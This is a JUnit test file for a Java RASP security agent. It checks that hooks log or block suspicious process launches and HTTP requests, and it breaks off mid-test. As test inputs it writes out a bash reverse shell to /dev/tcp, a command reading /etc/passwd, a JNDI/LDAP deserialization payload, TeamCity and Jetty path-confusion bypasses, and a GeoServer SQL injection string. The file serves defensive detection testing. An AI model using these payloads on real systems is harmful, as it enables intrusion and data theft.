package io.ohmyrasp.agent.java8;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.beans.Statement;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectStreamClass;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

final class Java8RaspHooksTest {
  private static final String HUGEGRAPH_DEFAULT_JWT =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
          + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
          + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg";
  private static final String HUGEGRAPH_TAMPERED_JWT =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
          + "eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9."
          + "mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqa";
  private static final String DATAEASE_WRONG_SIGNATURE_JWT =
      "eyJhbGciOiJIUzI1NiJ9."
          + "eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjo5NzM5NTIzNDgzfQ."
          + "7zfY8mKIUd0Q6AMp3_hxGNgF-KMkED7vc0PSH5vO4cQ";

  @AfterEach
  void clearProperties() {
    System.clearProperty("ohmyrasp.java8.log");
    System.clearProperty("ohmyrasp.java8.block");
    System.clearProperty("catalina.home");
    System.clearProperty("activemq.home");
  }

  @Test
  void ignoresNormalProcessBuilderCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("/bin/true"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsSuspiciousProcessBuilderCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-suspicious", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "cat /etc/passwd"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"event\":\"ohmyrasp-detection\""));
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void logsShellMetacharacterProcessBuilderCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-shell-meta", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "echo safe; id"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_shell_meta\""));
    assertTrue(text.contains("\"action\":\"log\""));
  }

  @Test
  void ignoresBenignTtyProbeShellCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-tty-probe", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "stty -g < /dev/tty"));
    Java8RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "-c", "stty -a < /dev/tty"));
    Java8RaspHooks.beforeProcessBuilderStart(
        new ProcessBuilder("sh", "-c", "stty -icanon min 1 -icrnl -inlcr -ixon < /dev/tty"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresBenignLocalBrowserLaunchShellCommand() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-local-browser", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeProcessBuilderStart(
        new ProcessBuilder(
            "sh",
            "-c",
            "xdg-open \"http://localhost:8080\" || firefox \"http://localhost:8080\" || mozilla \"http://localhost:8080\" || konqueror \"http://localhost:8080\" || opera \"http://localhost:8080\""));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresPlainShellScriptFileOutsideSchedulerStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-plain-shell-file", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeProcessBuilderStart(new ProcessBuilder("sh", "/tmp/maintenance.sh"));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksXStreamDeserializationProcessBuilderCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xstream-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            com.thoughtworks.xstream.core.TreeUnmarshaller.invokeJava8ProcessBuilderStart(
                new ProcessBuilder("touch", "/tmp/ohmyrasp-s2052-success")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("XML polymorphic deserialization reached a Java 8 process sink"));
    assertTrue(text.contains("touch /tmp/ohmyrasp-s2052-success"));
  }

  @Test
  void blocksJavaDeserializationProcessBuilderCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-axis2-deser-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            org.apache.axis2.context.externalize.SafeObjectInputStream
                .invokeJava8ProcessBuilderStart(
                    new ProcessBuilder("touch", "/tmp/ohmyrasp-coldfusion-3066-success")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("Java deserialization reached a Java 8 process sink"));
    assertTrue(text.contains("touch /tmp/ohmyrasp-coldfusion-3066-success"));
  }

  @Test
  void blocksJiffleRuntimeCommandStackWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jiffle-command", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            it.geosolutions.jaiext.jiffle.runtime.JiffleIndirectRuntimeImpl
                .invokeJava8JiffleRuntimeCommand());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("Jiffle runtime reached a Java 8 process sink"));
    assertTrue(text.contains("\"command\":\"id\""));
  }

  @Test
  void ignoresKkFileViewOfficeCleanupCommands() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-office-cleanup", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    cn.keking.service.OfficePluginManager.invokeJava8OfficeCountCommand();
    cn.keking.service.OfficePluginManager.invokeJava8OfficeKillCommand();

    assertFalse(Files.exists(log));
  }

  @Test
  void logsXxlJobSchedulerScriptCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xxljob-shell", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    com.xxl.job.core.handler.impl.ScriptJobHandler.invokeJava8GlueShell();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_shell_meta\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("/data/applogs/xxl-job/jobhandler/gluesource/1_1586699003758.sh"));
  }

  @Test
  void blocksXxlJobSchedulerScriptCommandStackWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xxljob-shell-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> com.xxl.job.core.handler.impl.ScriptJobHandler.invokeJava8GlueShell());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_shell_meta\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresPlainRuntimeTouchCommandOutsideExpressionStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-runtime-touch-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeRuntimeExecString("touch /tmp/ohmyrasp-unomi-touch-success");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsSpringBeanInitializationProcessCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-spring-bean-process", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitTouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-activemq46604-success"));
  }

  @Test
  void ignoresTikaExternalParserVersionCheckDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-tika-version-check", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitTikaCheck();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresGetconfClockTickDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-getconf-clktck", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitGetconfClockTick();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitGetconfPageSize();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitLscpuTopology();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitVcgenTemperature();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitDmidecodeProcessorProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitCpuidProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitOsReleaseProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitLdconfigProbe();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitUnameProbe();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresIdentityProbeDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-spring-id-probe", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitIdentityProbe();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresTeamCityMetadataVerifierDuringSpringInitialization() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-metadata", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitTeamCityMetadataVerifier();
    org.springframework.context.support.AbstractApplicationContext
        .invokeJava8SpringBeanInitTeamCityServerJarMetadataVerifier();

    assertFalse(Files.exists(log));
  }

  @Test
  void logsExpressionLanguageRuntimeCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-mvel-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    org.mvel2.MVEL.invokeJava8TouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-unomi-touch-success"));
  }

  @Test
  void logsElasticsearchShadedMvelRuntimeCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-es-mvel-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    org.elasticsearch.common.mvel2.MVEL.invokeJava8TouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-es-3120-success"));
  }

  @Test
  void blocksExpressionLanguageRuntimeCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-mvel-runtime-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(Java8RaspBlockException.class, () -> org.mvel2.MVEL.invokeJava8TouchCommand());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void blocksElasticsearchShadedMvelRuntimeCommandWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-es-mvel-runtime-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> org.elasticsearch.common.mvel2.MVEL.invokeJava8TouchCommand());

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsSolrRunExecutableListenerCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-solr-runexec", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    org.apache.solr.core.RunExecutableListener.invokeJava8TouchCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("touch /tmp/ohmyrasp-solr12629-success"));
  }

  @Test
  void logsDatabaseJavaRoutineCommandStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-derby-routine", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    org.apache.derby.impl.sql.execute.DerbyRoutineCommandProbe.invokeJava8IdCommand();

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_command_execution_exploit_primitive\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("\"command\":\"id\""));
  }

  @Test
  void blocksWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeProcessBuilderStart(
                new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresNormalHttpRequestPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-request-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/admin/login.jsp", ""));
    Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/WEB-INF/web.xml", ""));

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksWddxTypedPayloadRequestWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-wddx-typed-payload", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");
    String payload =
        "<wddxPacket version='1.0'><header/><data>"
            + "<struct type='xcom.sun.rowset.JdbcRowSetImplx'>"
            + "<var name='dataSourceName'><string>ldap://127.0.0.1:1389/Exploit</string></var>"
            + "<var name='autoCommit'><boolean value='true'/></var>"
            + "</struct></data></wddxPacket>";

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub(
                        "POST",
                        "/CFIDE/adminapi/accessmanager.cfc",
                        "method=foo&_cfclient=true")
                    .withHeader("Content-Type", "application/x-www-form-urlencoded")
                    .withParameter("argumentCollection", payload)));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_typed_payload_deserialization\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("parameter=argumentCollection"));
    assertTrue(text.contains("class=com.sun.rowset.JdbcRowSetImpl"));
    assertTrue(text.contains("trigger=jndi:ldap"));
    assertTrue(text.contains("value=[redacted]"));
    assertFalse(text.contains("ldap://127.0.0.1"));
  }

  @Test
  void ignoresTypedPayloadRequestWithoutDangerousClassAndTriggerPair() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-wddx-safe", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/CFIDE/adminapi/accessmanager.cfc", "")
            .withParameter(
                "argumentCollection",
                "{\"@type\":\"com.example.SafeBean\",\"dataSourceName\":\"ldap://127.0.0.1/a\"}"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/CFIDE/adminapi/accessmanager.cfc", "")
            .withParameter(
                "argumentCollection",
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"jdbc:h2:mem:test\"}"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresTeamCityInstallLinksFragmentPathWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-installlinks", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/admin/../installLinks.jspf", ""));
    Java8RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksTeamCityDebugProcessLaunchWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-debug-process", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub("POST", "/app/rest/debug/processes", "exePath=id")
                    .withParameter("exePath", "id")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_debug_process_launch\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("parameter=exePath"));
    assertTrue(text.contains("commandLength=2"));
    assertTrue(text.contains("value=[redacted]"));
    assertFalse(text.contains("exePath=id"));
  }

  @Test
  void ignoresDebugProcessRequestWithoutExecutableParameter() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-debug-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/app/rest/debug/processes", "locator=all")
            .withParameter("locator", "all"));
    Java8RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresExecutableParameterOutsideDebugProcessContext() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-debug-outside", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("POST", "/app/rest/builds", "exePath=id")
            .withParameter("exePath", "id"));
    Java8RaspHooks.afterHttpRequest();

    assertFalse(Files.exists(log));
  }

  @Test
  void blocksTeamCityInternalForwardWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-forward-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/hax", "jsp=/app/rest/users;.jsp")
                    .withParameter("jsp", "/app/rest/users;.jsp")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_internal_forward\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("target=/app/rest/users;.jsp"));
  }

  @Test
  void logsEncodedTeamCityInternalForward() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-forward-encoded", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/hax", "jsp=%2Fapp%2Frest%2Fusers%3B.jsp")
            .withParameter("jsp", "%2Fapp%2Frest%2Fusers%3B.jsp"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_internal_forward\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("target=/app/rest/users;.jsp"));
  }

  @Test
  void ignoresInternalForwardWithoutServletSuffixConfusion() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-teamcity-forward-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/hax", "jsp=/app/rest/users")
            .withParameter("jsp", "/app/rest/users"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsForgedIncludeProtectedWebResourceAttribute() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-forged-include", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/asdf", "")
            .withAttribute("javax.servlet.include.request_uri", "/")
            .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")
            .withAttribute("javax.servlet.include.servlet_path", "/"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_forged_include_attribute\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("WEB-INF/web.xml"));
  }

  @Test
  void blocksForgedIncludeProtectedWebResourceAttributeWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-forged-include-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub("GET", "/asdf", "")
                    .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_forged_include_attribute\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void ignoresRequestDispatcherIncludeAttributes() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-forged-include-dispatcher", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    ApplicationDispatcher.include(
        new RequestStub("GET", "/page", "")
            .withAttribute("javax.servlet.include.request_uri", "/")
            .withAttribute("javax.servlet.include.path_info", "WEB-INF/web.xml")
            .withAttribute("javax.servlet.include.servlet_path", "/"));

    assertFalse(Files.exists(log));
  }

  @Test
  void ignoresLiferayPortalInternalJspIncludes() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-liferay-portal-include", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "")
            .withAttribute("javax.servlet.include.request_uri", "/")
            .withAttribute("javax.servlet.include.servlet_path", "/html/portal/render_portlet.jsp"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/c/portal/layout", "")
            .withAttribute("javax.servlet.include.request_uri", "/c/portal/layout")
            .withAttribute("javax.servlet.include.servlet_path", "/html/portal/layout/view/portlet.jsp"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/c/portal/status", "")
            .withAttribute("javax.servlet.include.request_uri", "/c/portal/status")
            .withAttribute("javax.servlet.include.servlet_path", "/html/taglib/ui/quick_access/page.jsp"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/", "")
            .withAttribute("javax.servlet.include.request_uri", "/")
            .withAttribute("javax.servlet.include.servlet_path", "/WEB-INF/../html/portal/render_portlet.jsp"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/o/portal-search-web/search/bar/view.jsp", "")
            .withAttribute("javax.servlet.include.request_uri", "/o/portal-search-web/search/bar/view.jsp")
            .withAttribute("javax.servlet.include.servlet_path", "/search/bar/view.jsp"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/o/site-navigation-menu-web/view.jsp", "")
            .withAttribute("javax.servlet.include.request_uri", "/o/site-navigation-menu-web/view.jsp")
            .withAttribute("javax.servlet.include.servlet_path", "/view.jsp"));
    Java8RaspHooks.beforeHttpRequest(
        new RequestStub("GET", "/c/portal/layout", "")
            .withAttribute("javax.servlet.include.request_uri", "/c/portal/layout")
            .withAttribute("javax.servlet.include.servlet_path", "/dynamic_include/top_head.jsp"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJettyEncodedDotWebInfDisclosurePath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jetty-webinf", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/%2e/WEB-INF/web.xml", ""));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("/WEB-INF/web.xml"));
  }

  @Test
  void blocksJettyEncodedDotWebInfDisclosurePathWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jetty-webinf-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/%2e/WEB-INF/web.xml", "")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"block\""));
  }

  @Test
  void logsShiroSingleDotAdminBypassPath() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-shiro-dot", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeHttpRequest(new RequestStub("GET", "/./admin", ""));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_request_path_confusion\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("/admin"));
  }

  @Test
  void blocksGeoServerCqlFilterSqlInjectionWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-geoserver-cql", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    String filter =
        "strStartsWith(name,'x'') = true and 1=(SELECT CAST ((SELECT version()) AS integer))"
            + " -- ') = true";

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeHttpRequest(
                new RequestStub(
